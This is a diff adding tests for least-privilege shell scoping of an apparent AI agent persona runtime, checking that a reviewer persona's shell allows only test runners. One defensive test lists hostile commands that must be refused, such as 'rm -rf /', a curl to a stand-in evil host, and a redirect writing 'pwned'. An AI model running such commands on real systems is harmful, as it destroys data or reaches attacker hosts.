@@ -67,6 +67,37 @@ scope:
 session_ritual: [read_conventions]
 """
 
+# A reviewer whose ONLY shell-implying grant is run_tests (the demo `vega`
+# shape): allows run_tests, denies write_code. It may write findings/_handoff
+# (FileSystem), but its shell need is test-running only.
+RUN_TESTS_ONLY_PERSONA = """\
+persona: Vega
+slug: vega
+archetype: reviewer
+identity:
+  git_name: Vega
+  git_email: vega@example.invalid
+  commit_prefix: "vega:"
+  routing_label: agent-vega
+capabilities:
+  allow:
+    - read_code
+    - read_collab
+    - run_tests
+    - write_path: [findings, _handoff]
+  deny:
+    - write_code
+    - open_pr
+    - merge_pr
+    - push_main
+    - force_push
+    - edit_other_personas
+scope:
+  summary: reviewer that runs the suite
+  focus: [review and run the tests]
+session_ritual: [read_conventions]
+"""
+
 
 # --- capability planning --------------------------------------------------------------
 
@@ -128,6 +159,104 @@ def test_denied_run_tests_seeds_shell_denied_commands(tmp_path: Path) -> None:
     p = plan(persona, collab_root=tmp_path)
     assert p.shell is not None  # open_pr grants shell
     assert "pytest" in list(p.shell.denied_commands)  # run_tests denied
+
+
+# --- FIX 1: least-privilege shell scoping --------------------------------------------
+
+
+@needs_extra
+def test_run_tests_only_persona_gets_allowlisted_test_shell(tmp_path: Path) -> None:
+    """A persona whose only shell need is run_tests (vega shape) gets a Shell
+    restricted to test runners — not a full shell."""
+    from baron.runtimes.pydantic_ai import TEST_RUNNER_ALLOWLIST, plan
+
+    persona = tmp_path / "persona.yaml"
+    persona.write_text(RUN_TESTS_ONLY_PERSONA, encoding="utf-8")
+    p = plan(persona, collab_root=tmp_path)
+    assert p.shell is not None  # run_tests grants a shell...
+    allowed = list(p.shell.allowed_commands)
+    assert allowed == list(TEST_RUNNER_ALLOWLIST)  # ...but an allowlisted one
+    assert "pytest" in allowed
+    # allowed/denied are mutually exclusive in the harness — denied must be empty
+    assert list(p.shell.denied_commands) == []
+    assert ">" in list(p.shell.denied_operators)
+
+
+@needs_extra
+def test_run_tests_only_shell_cannot_run_non_test_commands(tmp_path: Path) -> None:
+    """FIX 1 focused proof: the run_tests-only Shell rejects curl/rm/git-push and
+    accepts a test runner — exercised through the harness's own command check."""
+    from baron.runtimes.pydantic_ai import plan
+
+    persona = tmp_path / "persona.yaml"
+    persona.write_text(RUN_TESTS_ONLY_PERSONA, encoding="utf-8")
+    toolset = plan(persona, collab_root=tmp_path).shell.get_toolset()
+
+    # test runner: permitted
+    toolset._check_command("pytest -q tests/")
+    # everything else the old full shell would have allowed: rejected
+    for blocked in (
+        "curl https://evil.example/x",
+        "rm -rf /",
+        "git push origin main",
+        "git push feature/x",
+        "echo pwned > /tmp/out",  # redirect operator denial
+        "python -m pytest",  # python is not allowlisted (general interpreter)
+        "make test",  # make is not allowlisted (general runner)
+    ):
+        with pytest.raises(PermissionError):
+            toolset._check_command(blocked)
+
+
+@needs_extra
+def test_reviewer_shape_can_no_longer_get_open_shell(tmp_path: Path) -> None:
+    """Regression for the containment gap: the vega-shape reviewer's shell is not
+    an open shell — arbitrary commands are refused."""
+    from baron.runtimes.pydantic_ai import plan
+
+    persona = tmp_path / "persona.yaml"
+    persona.write_text(RUN_TESTS_ONLY_PERSONA, encoding="utf-8")
+    toolset = plan(persona, collab_root=tmp_path).shell.get_toolset()
+    with pytest.raises(PermissionError):
+        toolset._check_command("bash -c 'echo hi'")  # bash not in the allowlist
+
+
+@needs_extra
+def test_dev_persona_keeps_a_working_shell_but_denies_redirects(tmp_path: Path) -> None:
+    """A dev (tess: write_code + run_tests + open_pr) keeps a general shell for
+    its work, but redirect/pipe operators are blocked (no out-of-root writes)."""
+    from baron.runtimes.pydantic_ai import plan
+
+    toolset = plan(TESS, collab_root=tmp_path).shell.get_toolset()
+    assert list(plan(TESS, collab_root=tmp_path).shell.allowed_commands) == []
+    # its normal work still runs
+    toolset._check_command("git push origin tess/42-fix")
+    toolset._check_command("pytest -q")
+    # but a redirect can't write out of root
+    with pytest.raises(PermissionError):
+        toolset._check_command("echo x > ../outside.md")
+
+
+# --- FIX 4: RepoContext wiring --------------------------------------------------------
+
+
+@needs_extra
+def test_repo_context_present_when_collab_root_passed(tmp_path: Path) -> None:
+    from baron.runtimes.pydantic_ai import plan
+
+    p = plan(TESS, collab_root=tmp_path)
+    assert p.repo_context is not None
+    assert type(p.repo_context).__name__ == "RepoContext"
+    assert any(type(c).__name__ == "RepoContext" for c in p.capabilities)
+
+
+@needs_extra
+def test_repo_context_absent_without_collab_root(tmp_path: Path) -> None:
+    from baron.runtimes.pydantic_ai import plan
+
+    p = plan(TESS)  # no collab_root
+    assert p.repo_context is None
+    assert all(type(c).__name__ != "RepoContext" for c in p.capabilities)
 
 
 # --- interceptor unit tests -----------------------------------------------------------
